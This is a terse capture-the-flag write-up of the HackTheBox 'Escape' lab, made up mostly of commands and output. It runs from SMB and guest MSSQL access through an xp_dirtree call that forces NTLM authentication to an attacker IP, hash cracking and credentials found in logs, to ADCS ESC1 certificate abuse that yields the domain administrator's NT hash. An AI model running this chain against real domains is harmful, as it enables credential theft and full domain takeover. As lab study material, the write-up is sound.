---
title: HackTheBox-Escape
date: 2024-12-24 23:20:00 +/-TTTT
categories: [boxes, red-teaming]
tags: [DevelopGroup, DnsAdmin]     # TAG names should always be lowercase
---

## SMB-enum
    ➜  escape nxc smb 10.10.11.202
    SMB         10.10.11.202    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)

    ➜  escape smbclient -L \\DC
    Password for [WORKGROUP\root]:

            Sharename       Type      Comment
            ---------       ----      -------
            ADMIN$          Disk      Remote Admin
            C$              Disk      Default share
            IPC$            IPC       Remote IPC
            NETLOGON        Disk      Logon server share 
            Public          Disk      
            SYSVOL          Disk      Logon server share 
    Reconnecting with SMB1 for workgroup listing.


    For new hired and those that are still waiting their users to be created and perms assigned, can sneak a peek at the Database with
    user PublicUser and password GuestUserCantWrite1 .

## MSSQL

    ➜  escape nxc mssql DC -u 'PublicUser' -p 'GuestUserCantWrite1' --local-auth
    MSSQL       10.10.11.202    1433   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
    MSSQL       10.10.11.202    1433   DC               [+] DC\PublicUser:GuestUserCantWrite1 

### access as guest

    ➜  escape impacket-mssqlclient PublicUser:GuestUserCantWrite1@sequel.htb
    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

    [*] Encryption required, switching to TLS
    [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
    [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
    [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
    [*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
    [*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
    [*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
    [!] Press help for extra shell commands
    SQL (PublicUser  guest@master)> 

### MSSQL-enum-abuse

    SQL (PublicUser  guest@master)> SELECT name FROM master.dbo.sysdatabases;
    name     
    ------   
    master   

    tempdb   

    model    

    msdb

    those are all default databases


    ------------   -----   ----   
    SQL (PublicUser  guest@master)> EXEC xp_dirtree '\\10.10.14.4\share', 1, 1
    subdirectory   depth   file   
    ------------   -----   ----
### crack hash

    ➜  escape john sql_svc.hash --wordlist=/usr/share/wordlists/rockyou.txt 
    Using default input encoding: UTF-8
    Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
    Will run 6 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    REGGIE1234ronnie (sql_svc) 

## winrm-enum


    2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
    2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
    2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'

## ADCS

    ➜  escape nxc ldap DC -u 'Ryan.Cooper' -p 'NuclearMosquito3' -M adcs
    SMB         10.10.11.202    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
    LDAPS       10.10.11.202    636    DC               [+] sequel.htb\Ryan.Cooper:NuclearMosquito3
    ADCS        10.10.11.202    389    DC               [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
    ADCS        10.10.11.202    389    DC               Found PKI Enrollment Server: dc.sequel.htb
    ADCS        10.10.11.202    389    DC               Found CN: sequel-DC-CA

### find vuln

    ➜  escape certipy-ad find -u Ryan.Cooper -p 'NuclearMosquito3' -dc-ip 10.10.11.202 -vulnerable -enabled


    ➜  escape cat 20241224072819_Certipy.txt
    Certificate Authorities
    0
        CA Name                             : sequel-DC-CA
        DNS Name                            : dc.sequel.htb
        Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
        Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
        Certificate Validity Start          : 2022-11-18 20:58:46+00:00
        Certificate Validity End            : 2121-11-18 21:08:46+00:00
        Web Enrollment                      : Disabled
        User Specified SAN                  : Disabled
        Request Disposition                 : Issue
        Enforce Encryption for Requests     : Enabled
        Permissions
        Owner                             : SEQUEL.HTB\Administrators
        Access Rights
            ManageCertificates              : SEQUEL.HTB\Administrators
                                            SEQUEL.HTB\Domain Admins
                                            SEQUEL.HTB\Enterprise Admins
            ManageCa                        : SEQUEL.HTB\Administrators
                                            SEQUEL.HTB\Domain Admins
                                            SEQUEL.HTB\Enterprise Admins
            Enroll                          : SEQUEL.HTB\Authenticated Users
    Certificate Templates
    0
        Template Name                       : UserAuthentication
        Display Name                        : UserAuthentication
        Certificate Authorities             : sequel-DC-CA
        Enabled                             : True
        Client Authentication               : True
        Enrollment Agent                    : False
        Any Purpose                         : False
        Enrollee Supplies Subject           : True
        Certificate Name Flag               : EnrolleeSuppliesSubject
        Enrollment Flag                     : PublishToDs
                                            IncludeSymmetricAlgorithms
        Private Key Flag                    : ExportableKey
        Extended Key Usage                  : Client Authentication
                                            Secure Email
                                            Encrypting File System
        Requires Manager Approval           : False
        Requires Key Archival               : False
        Authorized Signatures Required      : 0
        Validity Period                     : 10 years
        Renewal Period                      : 6 weeks
        Minimum RSA Key Length              : 2048
        Permissions
        Enrollment Permissions
            Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                            SEQUEL.HTB\Domain Users
                                            SEQUEL.HTB\Enterprise Admins
        Object Control Permissions
            Owner                           : SEQUEL.HTB\Administrator
            Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                            SEQUEL.HTB\Enterprise Admins
                                            SEQUEL.HTB\Administrator
            Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                            SEQUEL.HTB\Enterprise Admins
                                            SEQUEL.HTB\Administrator
            Write Property Principals       : SEQUEL.HTB\Domain Admins
                                            SEQUEL.HTB\Enterprise Admins
                                            SEQUEL.HTB\Administrator
        [!] Vulnerabilities
        ESC1                              : 'SEQUEL.HTB\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication

## ESC1

    ➜  escape certipy-ad req -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -upn administrator@sequel.htb -ca sequel-dc-ca -template UserAuthentication
    Certipy v4.8.2 - by Oliver Lyak (ly4k)

    [*] Requesting certificate via RPC
    [*] Successfully requested certificate
    [*] Request ID is 14
    [*] Got certificate with UPN 'administrator@sequel.htb'
    [*] Certificate has no object SID
    [*] Saved certificate and private key to 'administrator.pfx'

OR OR OR

    ➜  escape certipy-ad req -username ryan.cooper -password NuclearMosquito3 -ca sequel-DC-CA -target sequel.htb -template UserAuthentication -upn administrator@sequel.htb    
    Certipy v4.8.2 - by Oliver Lyak (ly4k)

    [*] Requesting certificate via RPC
    [*] Successfully requested certificate
    [*] Request ID is 15
    [*] Got certificate with UPN 'administrator@sequel.htb'
    [*] Certificate has no object SID

### crack-certipy-hash

    ➜  escape ntpdate -q sequel.htb
    2024-12-24 15:38:16.851156 (-0500) +28800.109132 +/- 0.083870 sequel.htb 10.10.11.202 s1 no-leap

#### faketime

    ➜  escape faketime '2024-12-24 15:38:34' certipy-ad auth -pfx administrator.pfx
    Certipy v4.8.2 - by Oliver Lyak (ly4k)

    [*] Using principal: administrator@sequel.htb
    [*] Trying to get TGT...
    [*] Got TGT
    [*] Saved credential cache to 'administrator.ccache'
    [*] Trying to retrieve NT hash for 'administrator'
    [*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee

